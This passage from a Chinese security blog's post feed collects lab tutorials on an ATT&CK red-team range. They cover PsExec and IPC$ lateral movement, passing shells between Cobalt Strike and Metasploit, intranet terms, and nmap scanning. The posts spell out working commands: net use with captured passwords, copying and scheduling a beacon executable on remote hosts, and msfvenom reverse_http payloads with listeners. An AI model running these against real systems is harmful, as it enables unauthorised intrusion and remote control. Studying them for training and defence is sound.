src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803164340141.png" alt="image-20230803164340141"></p><p>会反弹出一个子会话</p><p>然后我们回到这个新派生出来的会话上，右键点击interact，在beacon里输入以下命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 创建连接，admin$可以理解为共享了主机的控制权，账号密码为我们之前抓取的。</span>shell net use <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">10.10</span>.10.10<span class="token punctuation">\</span>admin$ /user:<span class="token string">"Administrator"</span> <span class="token string">"1qaz@WSX"</span> <span class="token function">ls</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">10.10</span>.10.10<span class="token punctuation">\</span>c$   <span class="token comment">#查看连接是否建立成功</span>jump psexec64 <span class="token number">10.10</span>.10.10 smb  <span class="token comment"># 建立smb beacon连接，最后的smb是我的smb listener 的名字。</span>net use <span class="token punctuation">\</span><span class="token punctuation">\</span>IP地址<span class="token punctuation">\</span>admin$ /delete <span class="token comment">#删除链接</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="记录存活主机"><a href="#记录存活主机" class="headerlink" title="记录存活主机"></a>记录存活主机</h3><p>进行端口扫描，主要是想cs的Targets中记录一下存活主机，之前利用梼杌插件中的fscan扫描主机，cs的Targets中是没有记录的。</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803163448976.png" alt="image-20230803163448976"></p><p>listeners创建一个payload为 Beacon SMB的监听，然后保存。</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803164513582.png" alt="image-20230803164513582"></p><h3 id="获取域权限"><a href="#获取域权限" class="headerlink" title="获取域权限"></a>获取域权限</h3><p>在目标主机图表上右击，jump–&gt;psexec64或者psexec，选择管理员账号，在填写上listener和session信息，直接选择launch发动，成功获取域控权限。</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230804095010643.png" alt="image-20230804095010643"></p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230804095107731.png" alt="image-20230804095107731"></p><p>成功获取DC权限</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230811151957645.png" alt="image-20230811151957645"></p><p>然后portscan  DC</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230811152524414.png" alt="image-20230811152524414"></p><p>发现不太行</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230811152916385.png" alt="image-20230811152916385"></p><p>有可能是开着防火墙呢</p><p>但是有思路可以参考</p><p>尝试用计划任务连接PC</p><p>控制web主机和PC建立IPC连接</p><pre class="line-numbers language-none"><code class="language-none">shell net use \\10.10.10.201\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后我们用cs生成一个新的木马上传到web主机上，然后在web主机上执行如下命令，将木马远程复制到PC上</p><pre class="line-numbers language-none"><code class="language-none">shell copy C:\Users\administrator.WEB\Desktop\beacon.exe \\10.10.10.201\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>检查是否上传成功</p><pre class="line-numbers language-none"><code class="language-none">shell dir \\10.10.10.201\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后利用计划任务运行该木马</p><pre class="line-numbers language-none"><code class="language-none">#创建计划任务schtasks &#x2F;create &#x2F;tn &quot;sec&quot; &#x2F;tr c:\\beacon.exe &#x2F;sc once &#x2F;st 20:40 &#x2F;S 10.10.10.201 &#x2F;RU System &#x2F;u administrator &#x2F;p &quot;1qaz@WSX&quot;#立即执行计划任务schtasks &#x2F;run &#x2F;tn &quot;sec&quot; &#x2F;S 10.10.10.201 &#x2F;u administrator &#x2F;p &quot;1qaz@WSX&quot;#删除计划任务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考文章：</p><p><a href="https://blog.csdn.net/qq_44029310/article/details/126039321">https://blog.csdn.net/qq_44029310/article/details/126039321</a></p><p><a href="https://developer.moduyun.com/column/detail/58968.html">https://developer.moduyun.com/column/detail/58968.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK红队实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK红队实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PsExec攻击</title>
      <link href="/2023/08/04/PsExec%E6%94%BB%E5%87%BB/"/>
      <url>/2023/08/04/PsExec%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> psexec是windows下的一款远程命令行工具。psexec的使用不需要对方主机开启3389端口，只需要对方开启admin$共享（该共享默认开启）。但是，假如目标主机开启了防火墙，psexec也是不能使用的，会提示找不到网络路径，由于psexec是windows提供的工具，所以杀毒软件会将其添加到白名单中。</p><p>psexec的基本原理是：通过管道在远程目标机器上创建一个psexec服务，并在本地磁盘中生成一个名为“PSEXESVC”的二进制文件。最后通过psexec服务运行命令。运行结束后删除服务。</p><p>  在使用psexec执行远程命令时，会在目标系统中创建一个psexec服务，命令执行后，psexec服务将会被自动删除。由于创建或删除服务时会产生大量的日志，所以会在攻击溯源时通过日志反推攻击流程。</p><h2 id="PsExec-exe"><a href="#PsExec-exe" class="headerlink" title="PsExec.exe"></a>PsExec.exe</h2><p>PsExec 是 PSTools 工具包里的一部分，其下载地址为：<a href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p><p>参数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-u：指定用户名-p：指定密码-accepteula:第一次运行psexec会弹出确认框，使用该参数就不会弹出确认框。-s：已system权限运行进程，获得一个system权限的交互shell，如果不使用该参数，会获得一个administrator权限的shell。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>先建立IPC$连接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net use <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span class="token punctuation">\</span>ipc$ <span class="token string">"passwd"</span> /user:username或者 net use <span class="token punctuation">\</span><span class="token punctuation">\</span>ip /u:yu<span class="token punctuation">\</span>username <span class="token string">"passwd"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">psexec.exe <span class="token punctuation">\</span>ip <span class="token parameter variable">-u</span> <span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token parameter variable">-p</span> <span class="token punctuation">[</span>password<span class="token punctuation">]</span>./ cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="MSF中PsExec模块"><a href="#MSF中PsExec模块" class="headerlink" title="MSF中PsExec模块"></a>MSF中PsExec模块</h2><p>MSF中的psexec主要有两个模块。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">exploit/windows/smb/psexec ：该模块生成的payload是exe程序。exploit/windows/smb/psexec_psh ：该模块生成的payload主要是由powershell实现。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意：powershell生成的payload免杀要比exe效果好。但是xp、2003的系统默认不包含powershell</p><p>但是我在我的msf里面只搜到了一个</p><p><img src="/2023/08/04/PsExec%E6%94%BB%E5%87%BB/image-20230804145713734.png" alt="image-20230804145713734"></p><p>可以看一下需要什么参数</p><p><img src="/2023/08/04/PsExec%E6%94%BB%E5%87%BB/image-20230804150106244.png" alt="image-20230804150106244"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/windows/smb/psexec<span class="token builtin class-name">set</span> rhosts <span class="token function">ip</span><span class="token builtin class-name">set</span> smbuser username<span class="token builtin class-name">set</span> smbpass <span class="token function">passwd</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意这里的smbpass选项，其可以为明文密码，也可以为Hash，但Hash必须是完整的，如果不知道前面的LM Hash部分，可以用零代替</p><h2 id="cs中psexec"><a href="#cs中psexec" class="headerlink" title="cs中psexec"></a>cs中psexec</h2><p>首先我们使用 Port Scan模块进行扫描，</p><p><img src="/2023/08/04/PsExec%E6%94%BB%E5%87%BB/image-20230804151832742.png" alt="image-20230804151832742"></p><p>如果有时候红框内为空，可以先试着提权然后在进行portscan</p><p><img src="/2023/08/04/PsExec%E6%94%BB%E5%87%BB/image-20230804152718907.png" alt="image-20230804152718907"></p><p>如果Ports为空那么只扫描存活的主机</p><p>存活的主机可以在 视图-&gt;目标中查看</p><p><img src="/2023/08/04/PsExec%E6%94%BB%E5%87%BB/image-20230804152857421.png" alt="image-20230804152857421"></p><p>然后右键选择psexec</p><p><img src="/2023/08/04/PsExec%E6%94%BB%E5%87%BB/image-20230804152939542.png" alt="image-20230804152939542"></p><p>参考文章：</p><p><a href="https://coar.wang/article/87">https://coar.wang/article/87</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PsExec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPC</title>
      <link href="/2023/08/04/IPC/"/>
      <url>/2023/08/04/IPC/</url>
      
        <content type="html"><![CDATA[<h2 id="IPC简介"><a href="#IPC简介" class="headerlink" title="IPC简介"></a>IPC简介</h2><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><pre class="line-numbers language-none"><code class="language-none">管理员开启了默认共享知道受害者的IP和登录密码开启了139、445端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="IPC入侵"><a href="#IPC入侵" class="headerlink" title="IPC入侵"></a>IPC入侵</h2><p>创建IPC$连接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net use <span class="token punctuation">\</span><span class="token punctuation">\</span>IP<span class="token punctuation">\</span>ipc$ <span class="token operator">&lt;</span>PASSWORD<span class="token operator">></span> /user:<span class="token operator">&lt;</span>USERNAME<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">copy C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Box<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>calc.bat <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span class="token punctuation">\</span>C$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>列出对方目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span class="token punctuation">\</span>c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>tasklist 查看进程</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tasklist /S <span class="token function">ip</span> /U username /P <span class="token function">passwd</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>断开连接</p><pre class="line-numbers language-none"><code class="language-none">net use \\ip\ipc$ &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>错误号</p><pre class="line-numbers language-none"><code class="language-none">1.错误号5，拒绝访问 ： 很可能你使用的用户不是管理员权限的，先提升权限；2.错误号51，Windows 无法找到网络路径 : 网络有问题；3.错误号53，找不到网络路径 ： ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）；4.错误号67，找不到网络名 ： 你的lanmanworkstation服务未启动；目标删除了ipc$； 5.错误号1219，提供的凭据与已存在的凭据集冲突 ： 你已经和对方建立了一个ipc$，请删除再连。6.错误号1326，未知的用户名或错误密码 ： 原因很明显了；7.错误号1792，试图登录，但是网络登录服务没有启动 ： 目标NetLogon服务未启动。（连接域控会出现此情况）8.错误号2242，此用户的密码已经过期 ： 目标有帐号策略，强制定期要求更改密码。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>可以参考teamssix佬的文章</p><p><a href="https://teamssix.com/210802-181052#toc-heading-2">https://teamssix.com/210802-181052#toc-heading-2</a></p><p>更详细的介绍：</p><p><a href="https://www.cnblogs.com/bmjoker/p/10355934.html">https://www.cnblogs.com/bmjoker/p/10355934.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IPC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cs与msf互传shell</title>
      <link href="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/"/>
      <url>/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/</url>
      
        <content type="html"><![CDATA[<p>在shell模式下，输入chcp 65001可以解决乱码</p><h2 id="cs传shell给msf"><a href="#cs传shell给msf" class="headerlink" title="cs传shell给msf"></a>cs传shell给msf</h2><p> 首先就是正常的靶机上线cs</p><p><img src="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/image-20230804103329419.png" alt="image-20230804103329419"></p><p>然后生成一个foreign的监听器</p><p><img src="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/image-20230804103634433.png" alt="image-20230804103634433"></p><p>在msf上设置监听</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_http set lhost 192.168.111.128set lport 6666run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/image-20230804104015994.png" alt="image-20230804104015994"></p><p>选择刚刚新建的msf监听器</p><p>msf已经接收到shell</p><p><img src="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/image-20230804104723403.png" alt="image-20230804104723403"></p><h2 id="msf传shell给cs"><a href="#msf传shell给cs" class="headerlink" title="msf传shell给cs"></a>msf传shell给cs</h2><p>首先先是msf获得shell</p><p>先生成对应的木马，设置对应的监听，把木马上传到目标机器并且执行，msf就获得了shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_http <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.111.128 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">5555</span> <span class="token parameter variable">-f</span> exe <span class="token operator">></span> hack.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/image-20230804120834033.png" alt="image-20230804120834033"></p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_httpset lhost 192.168.111.128set lport 5555run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/image-20230804120808246.png" alt="image-20230804120808246"></p><p>cs上设置监听</p><p><img src="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/image-20230804123026729.png" alt="image-20230804123026729"></p><p>拿到meterpreter之后先background</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;payload_injectset payload windows&#x2F;meterpreter&#x2F;reverse_httpset lhost 192.168.111.128set lport 7777set session 3set disablepayloadhandler trueexploit -j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/image-20230804122955587.png" alt="image-20230804122955587"></p><p>再回到cs，发现主机就已经上线了</p><p><img src="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/image-20230804123103907.png" alt="image-20230804123103907"></p><p>msf和cs的shell互不影响</p>]]></content>
      
      
      <categories>
          
          <category> cs和msf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cs与msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透中常见名词</title>
      <link href="/2023/08/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/"/>
      <url>/2023/08/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><p>工作组（Work Group）是局域网中的一个概念。它是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p><p>工作组(Work Group)是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在网上邻居内，可想而知会有多么乱(恐怕网络邻居也会显示“下一页”吧)。为了解决这一问题，Windows 9x&#x2F;NT&#x2F;2000才引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。</p><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p>域（Domain）是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系（即Trust Relation）。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。</p><p>域既是 Windows 网络操作系统的逻辑 组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域；每个域都有自己的安全策略，以及它与其他域的安全信任关系。</p><p>如果说工作组是“免费的旅店”那么域（Domain）就是“星级的宾馆”；工作组可以随便出出进进，而域则需要严格控制。“域”的真正含义指的是服务器控制网络上的计算机能否加入的计算机组合。一提到组合，势必需要严格的控制。所以实行严格的管理对网络安全是非常必要的。在对等网模式下，任何一台电脑只要接入网络，其他机器就都可以访问共享资源，如共享上网等。尽管对等网络上的共享文件可以加访问密码，但是非常容易被破解。在由Windows 9x构成的对等网中，数据的传输是非常不安全的。</p><p>工作组是一群计算机的集合，它仅仅是一个逻辑的集合，各自计算机还是各自管理的，你要访问其中的计算机，还是要到被访问计算机上来实现用户验证的。而域不同，域是一个有安全边界的计算机集合，在同一个域中的计算机彼此之间已经建立了信任关系，在域内访问其他机器，不再需要被访问机器的许可了。</p><h2 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h2><p>域控制器，是指在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为“域控制器（Domain Controller，简写为DC）”。</p><p>域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，他只能以对等网用户的方式访问Windows共享出来的资源，这样就在一定程度上保护了网络上的资源。</p><h2 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h2><p>DMZ，是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非安全系统安全系统之间的缓冲区。该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</p><p>实际的运用中，某些主机需要对外提供服务，为了更好地提供服务，同时又要有效地保护内部网络的安全，将这些需要对外开放的主机与内部的众多网络设备分隔开来，根据不同的需要，有针对性地采取相应的隔离措施，这样便能在对外提供友好的服务的同时最大限度地保护了内部网络。针对不同资源提供不同安全级别的保护，可以构建一个DMZ区域，DMZ可以为主机环境提供网络级的保护，能减少为不信任客户提供服务而引发的危险，是放置公共信息的最佳位置。在一个非DMZ系统中，内部网络和主机的安全通常并不如人们想象的那样坚固，提供给Internet的服务产生了许多漏洞，使其他主机极易受到攻击。但是，通过配置DMZ，我们可以将需要保护的Web应用程序服务器和数据库系统放在<a href="https://baike.baidu.com/item/%E5%86%85%E7%BD%91/0?fromModule=lemma_inlink">内网</a>中，把没有包含敏感数据、担当代理数据访问职责的主机放置于DMZ中，这样就为应用系统安全提供了保障。DMZ使包含重要数据的内部系统免于直接暴露给外部网络而受到攻击，攻击者即使初步入侵成功，还要面临DMZ设置的新的障碍。</p><h2 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h2><p>活动目录（Active Directory）是面向Windows Standard Server、Windows Enterprise Server以及 Windows Datacenter Server的目录服务。（Active Directory不能运行在Windows Web Server上，但是可以通过它对运行Windows Web Server的计算机进行管理。）Active Directory存储了有关网络对象的信息，并且让管理员和用户能够轻松地查找和使用这些信息。Active Directory使用了一种结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻辑的分层组织。</p><p>活动目录(Active Directory)主要提供以下功能：</p><p>①服务器及客户端计算机管理：管理服务器及客户端计算机账户，所有服务器及客户端计算机加入域管理并实施组策略。</p><p>②用户服务：管理用户域账户、用户信息、企业通讯录（与电子邮件系统集成）、用户组管理、用户身份认证、用户授权管理等，按省实施组管理策略。</p><p>③资源管理：管理打印机、文件共享服务等网络资源。</p><p>④桌面配置：系统管理员可以集中的配置各种桌面配置策略，如：用户使用域中资源权限限制、界面功能的限制、应用程序执行特征限制、网络连接限制、安全配置限制等。</p><p>⑤应用系统支撑：支持财务、人事、电子邮件、企业信息门户、办公自动化、补丁管理、防病毒系统等各种应用系统。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap</title>
      <link href="/2023/08/01/nmap/"/>
      <url>/2023/08/01/nmap/</url>
      
        <content type="html"><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><h2 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h2><p>扫描主机的「开放端口」，在nmap后面直接跟主机IP（默认扫描1000个端口）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="指定端口"><a href="#指定端口" class="headerlink" title="指定端口"></a>指定端口</h2><p>扫描「指定端口」，使用 -p 参数，可以一次扫描单个端口、多个端口、或扫描一个范围的端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token function">ip</span> <span class="token parameter variable">-p</span> <span class="token number">80</span>nmap <span class="token function">ip</span> <span class="token parameter variable">-p</span> <span class="token number">1</span>-80nmap <span class="token function">ip</span> <span class="token parameter variable">-p</span> <span class="token number">80,3389</span>nmap <span class="token function">ip</span> <span class="token parameter variable">-p</span> <span class="token number">1</span>-65535nmap <span class="token function">ip</span> -p-<span class="token comment"># -p- 等价于 -p 1-65535</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="指定扫描方式"><a href="#指定扫描方式" class="headerlink" title="指定扫描方式"></a>指定扫描方式</h2><h3 id="TCP全连接扫描"><a href="#TCP全连接扫描" class="headerlink" title="TCP全连接扫描"></a>TCP全连接扫描</h3><p>使用 -sT 参数进行TCP全连接扫描。</p><p>全连接扫描，使用完整的三次握手建立链接，能够建立链接就判定端口开放，否则判定端口关闭。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token function">ip</span> <span class="token parameter variable">-p</span> <span class="token number">80</span> <span class="token parameter variable">-sT</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果端口开放，就会进行完整的三次握手，成功建立链接，扫描结果中，STATE字段显示为 open 。</p><p>如果端口关闭，就只能进行一次握手，无法建立链接，扫描结果中，STATE字段显示为 closed。</p><h3 id="SYN半链接扫描"><a href="#SYN半链接扫描" class="headerlink" title="SYN半链接扫描"></a>SYN半链接扫描</h3><p>使用 -sS 参数进行SYN半链接扫描。</p><p>半链接扫描，只进行两次握手，对方返回确认帧（ACK&#x3D;1）就判定端口开放，否则判定端口关闭。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token function">ip</span> <span class="token parameter variable">-p</span> <span class="token number">80</span> <span class="token parameter variable">-sS</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果端口开放，就会进行两次握手，扫描结果中，STATE字段为 open 。</p><p>如果端口关闭，就只有一次握手，扫描结果中，STATE字段为 closed。</p><h3 id="隐秘扫描"><a href="#隐秘扫描" class="headerlink" title="隐秘扫描"></a>隐秘扫描</h3><p>隐秘扫描，只适用于Linux系统。</p><p>隐秘扫描，向目标主机的端口发送TCP FIN包 或 Xmas tree包 或 Null包，如果收到RST响应包，就判定端口关闭，否则就判定端口开放或被屏蔽（open&#x2F;filtered）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-p</span> <span class="token number">80</span> <span class="token parameter variable">-sF</span><span class="token comment"># Fin扫描</span>nmap <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-p</span> <span class="token number">80</span> <span class="token parameter variable">-sN</span><span class="token comment"># Null扫描（所有flags都为0的TCP包）</span>nmap <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-p</span> <span class="token number">80</span> <span class="token parameter variable">-sX</span><span class="token comment"># Xmas扫描（flags的FIN、URG、PUSH都为1的包）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><p>扫描网段中有哪些主机在线，使用 -sP 参数，不扫描端口，只扫描「存活主机」。</p><p>本质上是Ping扫描，能Ping通有回包，就判定主机在线。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.31.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h1><p>扫描端口时，默认显示端口对应的服务，但不显示服务版本。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token function">ip</span> <span class="token parameter variable">-p</span> <span class="token number">80</span> <span class="token parameter variable">-sV</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫描结果中，VERSION字段显示服务的详细版本。</p><h1 id="系统识别"><a href="#系统识别" class="headerlink" title="系统识别"></a>系统识别</h1><p>想要识别操作系统版本，可以使用 -O 参数。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token function">ip</span> <span class="token parameter variable">-p</span> <span class="token number">80</span> <span class="token parameter variable">-O</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/01/nmap/21549033-47e95acc884d9ac4.webp" alt="img"></p><p>参考文章：</p><p><a href="https://blog.csdn.net/wangyuxiang946/article/details/127710186">https://blog.csdn.net/wangyuxiang946/article/details/127710186</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>proxychains</title>
      <link href="/2023/07/26/proxychains/"/>
      <url>/2023/07/26/proxychains/</url>
      
